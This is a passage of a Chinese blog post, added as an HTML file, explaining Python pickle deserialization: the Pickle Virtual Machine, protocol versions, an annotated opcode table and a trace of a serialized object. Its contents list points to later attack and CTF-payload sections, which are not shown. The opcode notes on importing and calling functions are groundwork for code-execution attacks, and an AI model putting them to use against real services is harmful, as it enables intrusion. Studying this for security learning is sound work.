@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/upload/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/upload/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/upload/favicon-16x16.png">
+  <link rel="mask-icon" href="/upload/kaoruko.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"hllttz.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="python反序列化学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python反序列化">
+<meta property="og:url" content="https://hllttz.github.io/2025/09/10/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="hllttz&#39;s blog">
+<meta property="og:description" content="python反序列化学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250910232610015.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250910231943930.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250910232259081.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250911130450796.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250911140736760.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250911140814996.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250911143241696.png">
+<meta property="og:image" content="https://hllttz.github.io/images/202403251228130.png">
+<meta property="article:published_time" content="2025-09-10T13:49:54.000Z">
+<meta property="article:modified_time" content="2025-09-11T07:12:46.724Z">
+<meta property="article:author" content="hllttz">
+<meta property="article:tag" content="python,pickle,反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hllttz.github.io/images/image-20250910232610015.png">
+
+
+<link rel="canonical" href="https://hllttz.github.io/2025/09/10/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hllttz.github.io/2025/09/10/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","path":"2025/09/10/python反序列化/","title":"python反序列化"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>python反序列化 | hllttz's blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">hllttz's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">3</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">3</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.</span> <span class="nav-text">python反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%BA%93%E5%92%8C%E6%96%B9%E6%B3%95"><span class="nav-number">1.2.</span> <span class="nav-text">相关库和方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PVM"><span class="nav-number">1.3.</span> <span class="nav-text">PVM</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PVM%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.3.1.</span> <span class="nav-text">PVM协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#opcode"><span class="nav-number">1.3.2.</span> <span class="nav-text">opcode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.4.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="nav-number">1.5.</span> <span class="nav-text">攻击思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%AA%E5%8A%A8%E6%94%BB%E5%87%BB"><span class="nav-number">1.5.1.</span> <span class="nav-text">自动攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">相关魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#getnewargs-ex"><span class="nav-number">1.5.1.1.1.</span> <span class="nav-text">__getnewargs_ex__()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#getnewargs"><span class="nav-number">1.5.1.1.2.</span> <span class="nav-text">__getnewargs__()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#setstate"><span class="nav-number">1.5.1.1.3.</span> <span class="nav-text">__setstate__</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#reduce"><span class="nav-number">1.5.1.1.4.</span> <span class="nav-text">__reduce__</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8payload"><span class="nav-number">1.5.2.</span> <span class="nav-text">常用payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B2%A1%E6%9C%89os%E6%A8%A1%E5%9D%97"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">没有os模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%9C%89os%E6%A8%A1%E5%9D%97"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">环境有os模块</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">1.6.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HFCTF-2021-Final-easyflask"><span class="nav-number">1.6.1.</span> <span class="nav-text">[HFCTF 2021 Final]easyflask</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0xgame-2023-Notebook"><span class="nav-number">1.6.2.</span> <span class="nav-text">[0xgame 2023 Notebook]</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">hllttz</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hllttz.github.io/2025/09/10/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hllttz">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hllttz's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="python反序列化 | hllttz's blog">
+      <meta itemprop="description" content="python反序列化学习">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          python反序列化
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-09-10 21:49:54" itemprop="dateCreated datePublished" datetime="2025-09-10T21:49:54+08:00">2025-09-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-09-11 15:12:46" itemprop="dateModified" datetime="2025-09-11T15:12:46+08:00">2025-09-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/python-pickle/" itemprop="url" rel="index"><span itemprop="name">python,pickle</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>18k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>17 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">python反序列化学习</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="python反序列化"><a href="#python反序列化" class="headerlink" title="python反序列化"></a>python反序列化</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>和php的反序列化一样,python也存在反序列化,都是为了解决对象传输与持久化储存问题</p>
+<h2 id="相关库和方法"><a href="#相关库和方法" class="headerlink" title="相关库和方法"></a>相关库和方法</h2><p>在python中有两个库是用来序列化&#x2F;反序列化操作的,分别是<strong>pickle&#x2F;cPickle</strong>,(在python官方文档中,意思是封存&#x2F;解封),比较常见的是<strong>dumps</strong>(序列化)和<strong>loads</strong>(反序列化)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.a = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">test = Test()</span><br><span class="line"></span><br><span class="line">serialized = pickle.dumps(test)</span><br><span class="line"><span class="built_in">print</span>(serialized)</span><br><span class="line"></span><br><span class="line">unserialized = pickle.loads(serialized)</span><br><span class="line"><span class="built_in">print</span>(unserialized.a)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b&#x27;\x80\x04\x95&quot;\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Test\x94\x93\x94)\x81\x94&#125;\x94\x8c\x01a\x94K\x01sb.&#x27;</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>第一行看起来不太可读,下面是解释</p>
+<h2 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h2><p>要对序列化、反序列化很清楚的话，一定要了解 PVM</p>
+<p>首先，在调用 pickle 的时候，实际上是 <code>class pickle.Pickler</code> 和 <code>class pickle.Unpickler</code> 在起作用，而这两个类又是依靠 Pickle Virtual Machine(PVM)，在更深层对输入进行着某种操作，从而最后得到了那串复杂的结果。</p>
+<p>PVM 由三部分组成：</p>
+<ol>
+<li>指令处理器：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 这个结束符后停止（看上面的代码示例，序列化之后的结果最后是 <code>.</code>）。最终留在栈顶的值将被作为反序列化对象返回。需要注意的是：<ul>
+<li>opcode是单字节的</li>
+<li>带参数的指令用换行符来确定边界</li>
+</ul>
+</li>
+<li>栈区:用list实现的,被用来临时存储数据、参数以及对象</li>
+<li>内存去:用 dict 实现的，为 PVM 的整个生命周期提供存储</li>
+</ol>
+<p>最后，PVM 还有协议一说，这里的协议指定了应该采用什么样的序列化、反序列化算法</p>
+<h3 id="PVM协议"><a href="#PVM协议" class="headerlink" title="PVM协议"></a>PVM协议</h3><p>当前共有 6 种不同的协议可用，使用的协议版本越高，读取所生成 pickle 对象所需的 Python 版本就要越新</p>
+<ol>
+<li>v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python</li>
+<li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容</li>
+<li>v2 版协议是在 Python 2.3 中加入的，它为存储 new-style class 提供了更高效的机制（参考 PEP 307）。</li>
+<li>v3 版协议是在 Python 3.0 中加入的，它显式地支持 bytes 字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议。</li>
+<li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化（参考 PEP 3154）。它是 Python 3.8 使用的默认协议。</li>
+<li>v5 版协议是在 Python 3.8 中加入的。它增加了对带外数据的支持，并可加速带内数据处理（参考 PEP 574）。</li>
+</ol>
+<p>上面的代码示例其实可以指定PVM协议的版本,想得到人类易读的版本的话,可以指定一下版本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.a = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">test = Test()</span><br><span class="line"></span><br><span class="line">serialized = pickle.dumps(test,protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(serialized)</span><br><span class="line"></span><br><span class="line">unserialized = pickle.loads(serialized)</span><br><span class="line"><span class="built_in">print</span>(unserialized.a)</span><br></pre></td></tr></table></figure>
+
+<p>结果如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;ccopy_reg\n_reconstructor\np0\n(c__main__\nTest\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVa\np6\nI1\nsb.&#x27;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>关键代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pickle.dumps(obj[, protocol])</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>功能：将obj对象序列化为string形式，而不是存入文件中。 参数: obj：想要序列化的obj对象。 protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pickle.loads(string)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>功能：从string中读出序列化前的obj对象。 参数: string：文件名称。</p>
+</blockquote>
+<p>在序列化时，协议版本是自动检测出来的，所以诸如 loads 方法是不需要参数来指定协议的。</p>
+<p>由于不同版本在利用的时候没有很大区别，所以本文以最易读的 v0 协议为例</p>
+<h3 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h3><p>opcode 是 PVM 的灵魂，控制整个流程的运行.</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">MARK           = b&#x27;(&#x27;   # 向栈中压入一个 MARK 标记</span><br><span class="line">STOP           = b&#x27;.&#x27;   # 程序结束，栈顶的一个元素作为 pickle.loads() 的返回值</span><br><span class="line">POP            = b&#x27;0&#x27;   # 丢弃栈顶对象</span><br><span class="line">POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobject</span><br><span class="line">DUP            = b&#x27;2&#x27;   # duplicate top stack item</span><br><span class="line">FLOAT          = b&#x27;F&#x27;   # 实例化一个 float 对象</span><br><span class="line">INT            = b&#x27;I&#x27;   # 实例化一个 int 或者 bool 对象</span><br><span class="line">BININT         = b&#x27;J&#x27;   # push four-byte signed int</span><br><span class="line">BININT1        = b&#x27;K&#x27;   # push 1-byte unsigned int</span><br><span class="line">LONG           = b&#x27;L&#x27;   # push long; decimal string argument</span><br><span class="line">BININT2        = b&#x27;M&#x27;   # push 2-byte unsigned int</span><br><span class="line">NONE           = b&#x27;N&#x27;   # 栈中压入 None</span><br><span class="line">PERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string arg</span><br><span class="line">BINPERSID      = b&#x27;Q&#x27;   # push persistent object; id is taken from stack</span><br><span class="line">REDUCE         = b&#x27;R&#x27;   # 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈</span><br><span class="line">STRING         = b&#x27;S&#x27;   # 实例化一个字符串对象</span><br><span class="line">BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argument</span><br><span class="line">SHORT_BINSTRING= b&#x27;U&#x27;   # push string; counted binary string argument &lt; 256 bytes</span><br><span class="line">UNICODE        = b&#x27;V&#x27;   # 实例化一个 UNICODE 字符串对象</span><br><span class="line">BINUNICODE     = b&#x27;X&#x27;   # push Unicode string; counted UTF-8 string argument</span><br><span class="line">APPEND         = b&#x27;a&#x27;   # 将栈的第一个元素 append 到第二个元素（必须为列表）中</span><br><span class="line">BUILD          = b&#x27;b&#x27;   # 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()</span><br><span class="line">GLOBAL         = b&#x27;c&#x27;   # 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈</span><br><span class="line">DICT           = b&#x27;d&#x27;   # 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对），弹出组合，弹出 MARK，压回结果</span><br><span class="line">EMPTY_DICT     = b&#x27;&#125;&#x27;   # 向栈中直接压入一个空字典</span><br><span class="line">APPENDS        = b&#x27;e&#x27;   # 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中</span><br><span class="line">GET            = b&#x27;g&#x27;   # 将 memo[n] 的压入栈</span><br><span class="line">BINGET         = b&#x27;h&#x27;   # push item from memo on stack; index is 1-byte arg</span><br><span class="line">INST           = b&#x27;i&#x27;   # 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</span><br><span class="line">LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte arg</span><br><span class="line">LIST           = b&#x27;l&#x27;   # 从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为列表</span><br><span class="line">EMPTY_LIST     = b&#x27;]&#x27;   # 向栈中直接压入一个空列表</span><br><span class="line">OBJ            = b&#x27;o&#x27;   # 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果，</span><br><span class="line">PUT            = b&#x27;p&#x27;   # 将栈顶对象储存至 memo[n]</span><br><span class="line">BINPUT         = b&#x27;q&#x27;   # store stack top in memo; index is 1-byte arg</span><br><span class="line">LONG_BINPUT    = b&#x27;r&#x27;   # store stack top in memo; index is 4-byte arg</span><br><span class="line">SETITEM        = b&#x27;s&#x27;   # 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中</span><br><span class="line">TUPLE          = b&#x27;t&#x27;   # 寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果</span><br><span class="line">EMPTY_TUPLE    = b&#x27;)&#x27;   # 向栈中直接压入一个空元组</span><br><span class="line">SETITEMS       = b&#x27;u&#x27;   # 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中</span><br><span class="line">BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encoding</span><br><span class="line">TRUE           = b&#x27;I01\n&#x27;  # not an opcode; see INT docs in pickletools.py</span><br><span class="line">FALSE          = b&#x27;I00\n&#x27;  # not an opcode; see INT docs in pickletools.py</span><br></pre></td></tr></table></figure>
+
+<p>当然，这些都是 v0 协议的 opcode，其他版本的协议会新增&#x2F;替换一些 opcode</p>
+<p>以上面的<code>b&#39;ccopy_reg\n_reconstructor\np0\n(c__main__\nTest\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVa\np6\nI1\nsb.&#39;</code>为例子,现在来解读一下这个反序列化结果</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">c copy_reg _reconstructor: stack[copy_reg._reconstructor]</span><br><span class="line"></span><br><span class="line">p <span class="number">0</span>: memo[copy_reg._reconstructor]</span><br><span class="line"></span><br><span class="line">(: stack[(, copy_reg._reconstructor]</span><br><span class="line"></span><br><span class="line">c __main__ Test: stack[__main__.Test, (, copy_reg._reconstructor]</span><br><span class="line"></span><br><span class="line">p <span class="number">1</span>: memo[copy_reg._reconstructor, __main__.Test]</span><br><span class="line"></span><br><span class="line">c __builtin__ <span class="built_in">object</span>: stack[__builtin__.<span class="built_in">object</span>, __main__.Test, (, copy_reg._reconstructor]</span><br><span class="line"></span><br><span class="line">p <span class="number">2</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="built_in">object</span>]</span><br><span class="line"></span><br><span class="line">N: stack[<span class="literal">None</span>, __builtin__.<span class="built_in">object</span>, __main__.Test, (, copy_reg._reconstructor]</span><br><span class="line"></span><br><span class="line">t: stack[(<span class="literal">None</span>, __builtin__.<span class="built_in">object</span>, __main__.Test), copy_reg._reconstructor]</span><br><span class="line"></span><br><span class="line">p <span class="number">3</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="built_in">object</span>, (<span class="literal">None</span>, __builtin__.<span class="built_in">object</span>, __main__.Test)]</span><br><span class="line"></span><br><span class="line">R stack[&lt;__main__.Test at <span class="number">0x160578603d0</span>&gt;]</span><br><span class="line"></span><br><span class="line">p <span class="number">4</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="built_in">object</span>, (<span class="literal">None</span>, __builtin__.<span class="built_in">object</span>, __main__.Test), &lt;__main__.Test at <span class="number">0x160578603d0</span>&gt;]</span><br><span class="line"></span><br><span class="line">(: stack[(, &lt;__main__.Test at <span class="number">0x160578603d0</span>&gt;]</span><br><span class="line"></span><br><span class="line">d: stack[&#123;&#125;, &lt;__main__.Test at <span 